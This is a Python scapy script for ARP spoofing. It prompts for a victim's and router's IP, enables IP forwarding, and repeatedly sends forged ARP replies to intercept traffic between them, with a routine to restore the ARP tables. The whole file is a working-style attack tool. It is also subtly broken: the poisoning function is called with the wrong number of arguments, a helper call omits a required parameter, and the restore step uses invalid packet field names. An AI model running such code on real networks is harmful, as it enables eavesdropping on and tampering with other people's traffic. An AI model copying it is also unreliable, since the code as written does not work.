from scapy.all import *
import time
import os
import sys
################################################################
def poison(target_ip,gateway_ip, gateway_mac,target_mac):
    send(ARP(op=2,pdst=target_ip, psrc=gateway_ip,hwdst=target_mac))
    send(ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac))

#################################################################
def get_mac(ip,interface):  # arp ping
    conf.verb=0
    # sending and recieving packets by scapy module
    ans,unans= srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip),timeout=2, iface=interface,inter=0.1)
    for s,r in ans:
        return r.sprintf(r"%Ether.src%")  # python raw string literal
#################################################################
def restore_Arp(target_ip,gateway_ip, interface):
    target_mac=get_mac(target_ip,interface)
    gateway_mac=get_mac(gateway_ip,interface)
    send(ARP(OP=2, pdst=gateway_ip,psrc=target_ip,hwdst="ff:ff:ff:ff:ff:ff",hwsr=target_mac),count=5)
    send(ARP(OP=2, pdst=target_ip, psrc=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsr=gateway_mac), count=5)
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    sys.exit(1)

################################################################
def main():
    target_ip=input(" Enter IP of victim system  ")
    gateway_ip=input(" Enter IP of Router system  ")
    interface=input(" Enter interface of local system  ")
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")  # Enabling IP forward in linux
    try:
        target_mac=get_mac(target_ip,interface)

    except:
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")  # Disabling IP forward in linux
        print("Target mac address is not available ")
        sys.exit(1)
    try:
         gateway_mac=get_mac(gateway_ip)
    except:
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward ")   # Disabling IP forward in linux
        print("gateway mac address is not available ")
        sys.exit(1)
    while True:
        try:
            poison(gateway_mac,target_mac)
            time.sleep(2)

        except:
            restore_Arp(target_ip,gateway_ip, interface)
            sys.exit(1)
#####################################################################
if __name__ == "__main__":
        main()